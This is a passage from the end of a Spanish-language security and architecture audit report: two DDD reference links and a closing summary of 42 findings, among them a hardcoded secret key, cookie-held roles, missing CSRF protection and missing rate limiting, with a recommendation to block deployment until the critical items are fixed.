- **Domain-Driven Design (Evans)**: https://www.domainlanguage.com/ddd/
- **Implementing DDD (Vernon)**: https://www.pearson.com/en-us/subject-catalog/p/implementing-domain-driven-design/P200000009321

---

## Cierre del informe

Esta auditoría identificó **42 hallazgos** distribuidos entre vulnerabilidades de seguridad (27), errores de código (8) y desviaciones de arquitectura DDD (7). Seis hallazgos son críticos y requieren remediación inmediata antes de cualquier deploy a producción.

La combinación de **CRIT-01 (SECRET_KEY hardcodeado)** + **CRIT-03 (rol confinado a cookie)** + **CRIT-04 (JWT no re-validado)** permite un ataque de compromiso total del sistema en menos de una hora, sin necesidad de credenciales, con solo acceso de lectura al repositorio.

La ausencia de **CSRF (CRIT-02)**, **rate limiting (HIGH-03)** y **headers de seguridad (HIGH-04)** agrava el cuadro, permitiendo ataques desde fuera del sistema (CSRF, brute force, clickjacking).

Se recomienda **bloquear el deploy** hasta resolver al menos los 9 hallazgos de prioridad P0 (esfuerzo estimado: 4 días de desarrollo), y planificar dos sprints adicionales para P1 y P2.

Para soporte durante la implementación de los fixes, consultar las secciones de "Remediación" de cada hallazgo, que incluyen código de ejemplo listo para adaptar.
